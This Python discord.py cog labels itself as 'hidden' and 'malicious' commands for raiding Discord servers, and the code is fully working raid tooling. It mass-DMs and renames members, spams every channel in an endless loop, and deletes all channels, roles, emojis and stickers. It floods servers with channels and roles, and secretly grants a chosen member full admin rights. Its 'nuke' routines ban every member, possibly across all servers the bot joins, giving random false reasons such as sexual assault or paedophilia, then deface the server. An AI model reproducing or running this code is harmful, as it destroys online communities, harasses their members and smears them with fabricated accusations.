"""
cmds.py

This namespace contains the shared commands cog,
which provides a set of hidden commands for the bot.
These are the malicious commands that are used to raid servers.
"""

import asyncio
import os
import random
import time

import discord
import discord.ext.commands as commands

import shared.utils.utils_log as lu
from shared.dr.dr_types import EH_HiddenCommands_FriendlyNames


class Cmds(commands.Cog):
    
    def __init__(self, bot: commands.Bot):
        self.bot = bot
    
    def __add_to_running_command_names(self, command: str):
        """Adds a command to the running commands list.
        """
        self.bot.running_commands_names.append(command)
        self.bot.qthread.signal_refresh_running_commands_view.emit(0)

    def __remove_from_running_command_names(self, command: str):
        """Removes a command from the running commands list.
        """
        self.bot.running_commands_names.remove(command)
        self.bot.qthread.signal_refresh_running_commands_view.emit(0)

    async def nick_all(self, **kwargs):
        """Nicknames all members in the server.

        Kwargs to pass:
            guild_id (int): the guild id
            nickname (str): the nickname to set
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.NICK_ALL.value)
        self.bot.qthread.signal_append_hterminal.emit('Started nicknaming all members')

        guild_id = kwargs.get('guild_id', None)
        nickname = kwargs.get('nickname', None)

        guild = self.bot.get_guild(guild_id)

        results = await asyncio.gather(
            *[member.edit(nick=nickname) for member in guild.members], 
            return_exceptions=True)

        for result, member in zip(results, guild.members):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to change nickname for {member.name}#{member.discriminator}')
                lu.swarning(f'Failed to change nickname for {member.name}#{member.discriminator}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Changed nickname for {member.name}#{member.discriminator} to {member.nick}')
                lu.sinfo(f'Changed nickname for {member.name}#{member.discriminator} to {member.nick}')
        
        self.bot.qthread.signal_append_hterminal.emit('Finished nicknaming all members')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.NICK_ALL.value)
        return
    
    async def msg_all(self, **kwargs):
        """Messages all members in the server.

        Kwargs to pass:
            guild_id (int): the guild id
            message (str): the message to send
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.MSG_ALL.value)
        self.bot.qthread.signal_append_hterminal.emit('Started messaging all members')

        guild_id = kwargs.get('guild_id', None)
        message = kwargs.get('message', None)

        guild = self.bot.get_guild(guild_id)

        results = await asyncio.gather(
            *[member.send(message) for member in guild.members], 
            return_exceptions=True)

        for result, member in zip(results, guild.members):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to send message to {member.name}#{member.discriminator}')
                lu.swarning(f'Failed to send message to {member.name}#{member.discriminator}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Sent message to {member.name}#{member.discriminator} to {member.nick}')
                lu.sinfo(f'Sent message to {member.name}#{member.discriminator} to {member.nick}')
        
        self.bot.qthread.signal_append_hterminal.emit('Finished messaging all members')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.MSG_ALL.value)
        return
    
    async def spam(self, **kwargs):
        """Spams all text channels in the server.

        Kwargs to pass:
            guild_id (int): the guild id
            message (str): the message to spam
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.SPAM.value)
        self.bot.qthread.signal_append_hterminal.emit('Started spamming all channels. To cancel this process, you must cancel all tasks.')
        
        guild_id = kwargs.get('guild_id', None)
        message = kwargs.get('message', None)

        guild = self.bot.get_guild(guild_id)
        if guild is None:
            return

        while True:
            tasks = [channel.send(message) for channel in guild.text_channels if channel.permissions_for(guild.me).send_messages]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1)

    async def new_webhook(self, **kwargs):
        """Creates a new webhook in a channel.

        Kwargs to pass:
            guild_id (int): the guild id
            channel_id (int): the channel id
            name (str): the name of the webhook
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.NEW_WEBHOOK.value)
        self.bot.qthread.signal_append_hterminal.emit('Creating Webhook')

        guild_id = kwargs.get('guild_id', None)
        channel_id = kwargs.get('channel_id', None)
        name = kwargs.get('name', None)

        guild = self.bot.get_guild(guild_id)
        channel = discord.utils.get(guild.channels, id=channel_id)
        try:
            webhook = await channel.create_webhook(name=name)
        except discord.errors.HTTPException as e:
            lu.swarning(f'Failed to create webhook in channel {channel.name}: HTTPException: {e}')
            self.bot.qthread.signal_append_hterminal.emit('Failed to create webhook')
            return
        except Exception as e:
            self.bot.qthread.signal_append_hterminal.emit('Failed to create webhook')
            lu.swarning(f'Failed to create webhook in channel {channel.name}: Exception: {e}')
            return
        
        self.bot.qthread.signal_append_hterminal.emit(f'Created Webhook: {webhook.url}')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.NEW_WEBHOOK.value)
        return

    async def cpurge(self, **kwargs):
        """Deletes all channels in the server.

        Kwargs to pass:
            guild_id (int): the guild id
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.CPURGE.value)
        self.bot.qthread.signal_append_hterminal.emit('Purging Server Channels')

        guild_id = kwargs.get('guild_id', None)

        guild = self.bot.get_guild(guild_id)
        old_channels = guild.channels
        results = await asyncio.gather(
            *[c.delete() for c in guild.channels], 
            return_exceptions=True)

        for result, channel in zip(results, old_channels):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to delete channel {channel.name}')
                lu.swarning(f'Failed to delete channel {channel.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Deleted channel {channel.name}')
                lu.sinfo(f'Deleted channel {channel.name}')
        
        self.bot.qthread.signal_append_hterminal.emit('Finished Purging Server Channels')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.CPURGE.value)
        return
    
    async def cflood(self, **kwargs):
        """Creates a number of channels in the server.

        Kwargs to pass:
            guild_id (int): the guild id
            amount (int): the number of channels to create
            name (str): the name of the channels
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.CFLOOD.value)
        self.bot.qthread.signal_append_hterminal.emit('Flooding Server with Channels')
        
        guild_id = kwargs.get('guild_id', None)
        amount = kwargs.get('amount', None)
        name = kwargs.get('name', None)

        guild = self.bot.get_guild(guild_id)
        old_channels = guild.channels
        results = await asyncio.gather(
            *[guild.create_text_channel(name) for _ in range(amount)], 
            return_exceptions=True)
        
        new_channels = [c for c in guild.channels if c not in old_channels]
        for result, channel in zip(results, new_channels):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to create channel {channel.name}')
                lu.swarning(f'Failed to create channel {channel.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Created channel {channel.name}')
                lu.sinfo(f'Created channel {channel.name}')
                
        self.bot.qthread.signal_append_hterminal.emit('Finished Flooding Server with Channels')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.CFLOOD.value)
        return
    
    async def rpurge(self, **kwargs):
        """Deletes all roles in the server.

        Kwargs to pass:
            guild_id (int): the guild id
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RPURGE.value)
        self.bot.qthread.signal_append_hterminal.emit('Purging Server Roles')

        guild_id = kwargs.get('guild_id', None)

        guild = self.bot.get_guild(guild_id)

        old_roles = guild.roles
        results = await asyncio.gather(
            *[r.delete() for r in guild.roles],
            return_exceptions=True)
        
        for result, role in zip(results, old_roles):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to delete role {role.name}')
                lu.swarning(f'Failed to delete role {role.name}: {result}')
            # ? For some reason, if a role cannot be deleted due it being above the bot's role, it does not raise an exception.
            # ? Furthermore, regular roles that are deleted successfully are not appended to the terminal, only failed deletions are.
            # ? To avoid confusion, this code block is commented out.
            # else:
            #     self.bot.qthread.signal_append_hterminal.emit(f'Deleted role {role.name}')
            #     lu.sinfo(f'Deleted role {role.name}')


        self.bot.qthread.signal_append_hterminal.emit('Finished Purging Server Roles')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RPURGE.value)
        return
    
    async def rflood(self, **kwargs):
        """Creates a number of roles in the server.

        Kwargs to pass:
            guild_id (int): the guild id
            amount (int): the number of channels to create
            name (str): the name of the channels
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RFLOOD.value)
        self.bot.qthread.signal_append_hterminal.emit('Flooding Server with Roles')
        
        guild_id = kwargs.get('guild_id', None)
        amount = kwargs.get('amount', None)
        name = kwargs.get('name', None)
        guild = self.bot.get_guild(guild_id)

        old_roles = guild.roles
        results = await asyncio.gather(
            *[guild.create_role(name=name, permissions=discord.Permissions.none(), color=0xff0000) for _ in range(amount)], 
            return_exceptions=True)
        
        new_roles = [r for r in guild.roles if r not in old_roles]
        for result, role in zip(results, new_roles):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to create role {role.name}')
                lu.swarning(f'Failed to create role {role.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Created role {role.name}')
                lu.sinfo(f'Created role {role.name}')
                
        self.bot.qthread.signal_append_hterminal.emit('Finished Flooding Server with Roles')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RFLOOD.value)
        return
    
    async def admin(self, **kwargs):
        """Gives a member a new admin role.

        Kwargs to pass:
            guild_id (int): the guild id
            member_id (int): the member id
            role_name (str): the name of the role
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.ADMIN.value)
        self.bot.qthread.signal_append_hterminal.emit('Granting Admin Role')

        guild_id = kwargs.get('guild_id', None)
        member_id = kwargs.get('member_id', None)
        role_name = kwargs.get('role_name', None)

        guild = self.bot.get_guild(guild_id)
        member = guild.get_member(member_id)
        try:
            await guild.create_role(name=role_name, permissions=discord.Permissions.all())
            role = discord.utils.get(guild.roles, name=role_name)
            await member.add_roles(role)
        except discord.errors.HTTPException as e:
            self.bot.qthread.signal_append_hterminal.emit(f'Failed to grant admin role')
            lu.swarning(f'Failed to grant admin role: HTTPException: {e}')
            return
        except Exception as e:
            self.bot.qthread.signal_append_hterminal.emit(f'Failed to grant admin role')
            lu.swarning(f'Failed to grant admin role: Exception: {e}')
            return
        
        self.bot.qthread.signal_append_hterminal.emit(f'Granted Admin Role to {member.name}')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.ADMIN.value)
        return
    
    async def raid(self, **kwargs):
        """Raid the server.

        Kwargs to pass:
            guild_id (int): the guild id
            role_name (str): the name of the role
            nickname (str): the nickname to set
            amount (int): the number of channels to create
            name (str): the name of the channels
            message (str): the message to spam.
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RAID.value)
        self.bot.qthread.signal_append_hterminal.emit('Raiding Server')

        guild_id = kwargs.get('guild_id', None)
        role_name = kwargs.get('role_name', None)
        nickname = kwargs.get('nickname', None)
        amount = kwargs.get('amount', None)
        name = kwargs.get('name', None)
        message = kwargs.get('message', None)

        guild = self.bot.get_guild(guild_id)

        # Give everyone a role
        
        self.bot.qthread.signal_append_hterminal.emit('Granting Raid Role')
        try:
            await guild.create_role(name=role_name, permissions=discord.Permissions.none(), color=0xff0000)
            role = discord.utils.get(guild.roles, name=role_name)
            
            results = await asyncio.gather(
                *[member.add_roles(role) for member in guild.members], 
                return_exceptions=True)
            
            for result, member in zip(results, guild.members):
                if isinstance(result, Exception):
                    self.bot.qthread.signal_append_hterminal.emit(f'Failed to give role to {member.name}')
                    lu.swarning(f'Failed to give role to {member.name}: {result}')
                else:
                    self.bot.qthread.signal_append_hterminal.emit(f'Gave role to {member.name}')
                    lu.sinfo(f'Gave role to {member.name}')
        except discord.errors.HTTPException as e:
            self.bot.qthread.signal_append_hterminal.emit(f'Failed to grant raid role')
            lu.swarning(f'Failed to grant raid role: HTTPException: {e}')
        except Exception as e:
            self.bot.qthread.signal_append_hterminal.emit(f'Failed to grant admin role')
            lu.swarning(f'Failed to grant raid role: Exception: {e}')
        
        # Nickname everyone
        self.bot.qthread.signal_append_hterminal.emit('Changing Nicknames')
        
        results = await asyncio.gather(
            *[member.edit(nick=nickname) for member in guild.members], 
            return_exceptions=True)

        for result, member in zip(results, guild.members):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to change nickname for {member.name}')
                lu.swarning(f'Failed to change nickname for {member.name}#{member.discriminator}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Changed nickname for {member.name} to {member.nick}')
                lu.sinfo(f'Changed nickname for {member.name}#{member.discriminator} to {member.nick}')

        # Delete all channels
        self.bot.qthread.signal_append_hterminal.emit('Purging Server Channels')

        old_channels = guild.channels
        results = await asyncio.gather(
            *[c.delete() for c in guild.channels], 
            return_exceptions=True)

        for result, channel in zip(results, old_channels):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to delete channel {channel.name}')
                lu.swarning(f'Failed to delete channel {channel.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Deleted channel {channel.name}')
                lu.sinfo(f'Deleted channel {channel.name}')
        
        # Create iamount new channels
        self.bot.qthread.signal_append_hterminal.emit('Flooding Server with Channels')

        old_channels = guild.channels
        results = await asyncio.gather(
            *[guild.create_text_channel(name) for _ in range(amount)], 
            return_exceptions=True)
        
        new_channels = [c for c in guild.channels if c not in old_channels]
        for result, channel in zip(results, new_channels):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to create channel {channel.name}')
                lu.swarning(f'Failed to create channel {channel.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Created channel {channel.name}')
                lu.sinfo(f'Created channel {channel.name}')
        
        # Spam all channels
        self.bot.qthread.signal_append_hterminal.emit('Started spamming all channels. To cancel this process, you must cancel all tasks.')
        while True:
            tasks = [channel.send(message) for channel in guild.text_channels if channel.permissions_for(guild.me).send_messages]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1)

    async def nuke(self, **kwargs):
        """Nuke the server.

        Kwargs to pass:
            guild_id (int): the guild id
            excluded_member_id (int): the member id to exclude
        """
        # self.bot.qthread.signal_append_hterminal.emit('Nuking Server')
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.NUKE.value)

        guild_id = kwargs.get('guild_id', None)
        excluded_member_id = kwargs.get('excluded_member_id', None)
        new_guild_title = kwargs.get('new_guild_title', None)
        avatar_path = kwargs.get('avatar_path', None)

        guild = self.bot.get_guild(guild_id)  
        excluded_member = guild.get_member(excluded_member_id)      
        await self.__nuke(guild, excluded_member, new_guild_title, avatar_path)

        self.bot.qthread.signal_append_hterminal.emit('Finished Nuking Server')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.NUKE.value)
        return
    
    async def mass_nuke(self, **kwargs):
        """Nuke all servers the bot is in.

        Kwargs to pass:
            excluded_member_id (int): the member id to exclude
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.MASS_NUKE.value)
        excluded_member_id = kwargs.get('excluded_member_id', None)
        new_guild_title = kwargs.get('new_guild_title', None)
        avatar_path = kwargs.get('avatar_path', None)

        excluded_member = discord.utils.get(self.bot.get_all_members(), id=excluded_member_id)
        old_guilds = self.bot.guilds
        results = await asyncio.gather(
            *[self.__nuke(guild, excluded_member, new_guild_title, avatar_path) for guild in self.bot.guilds], 
            return_exceptions=True)
        
        for result, guild in zip(results, old_guilds):
            if isinstance(result, Exception):
                lu.swarning(f'Failed to nuke guild {guild.name}: {result}')
            else:
                lu.sinfo(f'Nuked guild {guild.name}')
        
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.MASS_NUKE.value)
        return
    
    async def leave(self, **kwargs):
        """Get the bot to leave the server.

        Kwargs to pass:
            guild_id (int): the guild id
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.LEAVE.value)
        self.bot.qthread.signal_append_hterminal.emit('Leaving Server')

        guild_id = kwargs.get('guild_id', None)
        guild = self.bot.get_guild(guild_id)
        try:
            await guild.leave()
        except Exception as e:
            self.bot.qthread.signal_append_hterminal.emit(f'Failed to leave guild {guild.name}')
            lu.swarning(f'Bot failed to leave the guild {guild.name}: {e}')
            return
        
        self.bot.qthread.signal_append_hterminal.emit(f'Left guild {guild.name}')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.LEAVE.value)
        return
    
    async def mass_leave(self):
        """Get the bot to leave all servers it is in.
        """
        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.MASS_LEAVE.value)
        self.bot.qthread.signal_append_hterminal.emit('Leaving All Servers')

        old_guilds = self.bot.guilds
        results = await asyncio.gather(
            *[guild.leave() for guild in self.bot.guilds], 
            return_exceptions=True)
        
        for result, guild in zip(results, old_guilds):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to leave guild {guild.name}')
                lu.swarning(f'Failed to leave guild {guild.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Left guild {guild.name}')
                lu.sinfo(f'Left guild {guild.name}')
        
        self.bot.qthread.signal_append_hterminal.emit('Finished Leaving All Servers')
        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.MASS_LEAVE.value)
        return
    
    async def __nuke(self, guild: discord.Guild, excluded_member: discord.Member, new_guild_title: str, avatar_path: str):
        self.bot.qthread.signal_append_hterminal.emit(f'Nuking Server {guild.name}')

        self.bot.qthread.signal_append_hterminal.emit(f'Banning Members')
        
        old_members = guild.members
        results = await asyncio.gather(
            *[member.ban(reason=random.choice([
                'Racism', 'Homophobia', 'Transphobia', 'Sexism', 
                'Ableism', 'Ageism', 'Sexual Harassment', 
                'Sexual Assault', 'Harassment', 'Stalking', 
                'Threats', 'Trolling', 'Cyberbullying', 'Bullying', 
                'Hacking', 'Doxing', 'Paedophillia'])
            ) for member in guild.members if not (member == excluded_member or member == self.bot.user)], 
            return_exceptions=True)
        for result, member in zip(results, old_members):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to ban member {member.name}')
                lu.swarning(f'Failed to ban member {member.name} from guild {guild.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Banned member {member.name}')
                lu.sinfo(f'Banned member {member.name} from guild {guild.name}')

        self.bot.qthread.signal_append_hterminal.emit(f'Deleting Channels')

        old_channels = guild.channels
        results = await asyncio.gather(
            *[c.delete() for c in guild.channels], 
            return_exceptions=True)
        for result, channel in zip(results, old_channels):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to delete channel {channel.name}')
                lu.swarning(f'Failed to delete channel {channel.name} from guild {guild.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Deleted channel {channel.name}')
                lu.sinfo(f'Deleted channel {channel.name} from guild {guild.name}')
        

        self.bot.qthread.signal_append_hterminal.emit(f'Deleting Roles, Emojis, and Stickers')

        old_roles = guild.roles
        results = await asyncio.gather(
            *[r.delete() for r in guild.roles], 
            return_exceptions=True)
        for result, role in zip(results, old_roles):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to delete role {role.name}')
                lu.swarning(f'Failed to delete role {role.name} from guild {guild.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Deleted role {role.name}')
                lu.sinfo(f'Deleted role {role.name} from guild {guild.name}')
        
        old_emojis = guild.emojis
        results = await asyncio.gather(
            *[e.delete() for e in guild.emojis], 
            return_exceptions=True)
        for result, emoji in zip(results, old_emojis):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to delete emoji {emoji.name}')
                lu.swarning(f'Failed to delete emoji {emoji.name} from guild {guild.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Deleted emoji {emoji.name}')
                lu.sinfo(f'Deleted emoji {emoji.name} from guild {guild.name}')
        
        old_stickers = guild.stickers
        results = await asyncio.gather(
            *[s.delete() for s in guild.stickers], 
            return_exceptions=True)
        for result, sticker in zip(results, old_stickers):
            if isinstance(result, Exception):
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to delete sticker {sticker.name}')
                lu.swarning(f'Failed to delete sticker {sticker.name} from guild {guild.name}: {result}')
            else:
                self.bot.qthread.signal_append_hterminal.emit(f'Deleted sticker {sticker.name}')
                lu.sinfo(f'Deleted sticker {sticker.name} from guild {guild.name}')
        
        self.bot.qthread.signal_append_hterminal.emit(f'Editing Guild')

        if not new_guild_title or len(new_guild_title) < 2 or len(new_guild_title) > 100:
            new_guild_title = 'Nuked by the-cult-of-integral'
        

        if not avatar_path:
            try:
                with open(os.path.join('_internal', 'shared', 'nuked.jpg'), 'rb') as nuke_icon:
                    icon = nuke_icon.read()
            except OSError as e:
                lu.swarning(f'Failed to read default nuke avatar file: {e}')
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to read default nuke avatar file.')
                icon = None
        else:
            try:
                with open(avatar_path, 'rb') as nuke_icon:
                    icon = nuke_icon.read()
            except OSError as e:
                lu.swarning(f'Failed to read avatar file: {e}')
                self.bot.qthread.signal_append_hterminal.emit(f'Failed to read avatar file for nuke.')
                try:
                    with open(os.path.join('_internal', 'shared', 'nuked.jpg'), 'rb') as nuke_icon:
                        icon = nuke_icon.read()
                except OSError as e:
                    lu.swarning(f'Failed to read default nuke avatar file: {e}')
                    self.bot.qthread.signal_append_hterminal.emit(f'Failed to read default nuke avatar file.')
                    icon = None
        
        try:
            flags = discord.SystemChannelFlags()
            flags.guild_reminder_notifications = True
            flags.join_notification_replies = False
            flags.join_notifications = False
            flags.premium_subscriptions = False
            flags.role_subscription_purchase_notification_replies = False
            flags.role_subscription_purchase_notifications = False
            
            if icon is None:
                await guild.edit(
                    name=new_guild_title,
                    description=new_guild_title,
                    discoverable=False,
                    community=False,
                    default_notifications=discord.NotificationLevel.all_messages,
                    verification_level=discord.VerificationLevel.highest,
                    explicit_content_filter=discord.ContentFilter.disabled,
                    premium_progress_bar_enabled=False,
                    preferred_locale=discord.Locale.japanese,
                    afk_channel=None,
                    afk_timeout=None,
                    system_channel=None,
                    system_channel_flags=flags,
                    rules_channel=None,
                    public_updates_channel=None
                )
            else:
                await guild.edit(
                    name=new_guild_title,
                    description=new_guild_title,
                    icon=icon,
                    banner=icon,
                    splash=icon,
                    discovery_splash=icon,
                    discoverable=False,
                    community=False,
                    default_notifications=discord.NotificationLevel.all_messages,
                    verification_level=discord.VerificationLevel.highest,
                    explicit_content_filter=discord.ContentFilter.disabled,
                    premium_progress_bar_enabled=False,
                    preferred_locale=discord.Locale.japanese,
                    afk_channel=None,
                    afk_timeout=None,
                    system_channel=None,
                    system_channel_flags=flags,
                    rules_channel=None,
                    public_updates_channel=None
                )

        except discord.HTTPException as e:
            lu.swarning(f'Failed to edit guild {guild.name}: HTTPException: {e}')
            self.bot.qthread.signal_append_hterminal.emit(f'Failed to edit guild {guild.name}')
        except Exception as e:
            self.bot.qthread.signal_append_hterminal.emit(f'Failed to edit guild {guild.name}')
            lu.swarning(f'Failed to edit guild {guild.name}: Exception: {e}')

        self.bot.qthread.signal_append_hterminal.emit(f'Nuked Server {guild.name}')


async def setup(bot):
    await bot.add_cog(Cmds(bot))
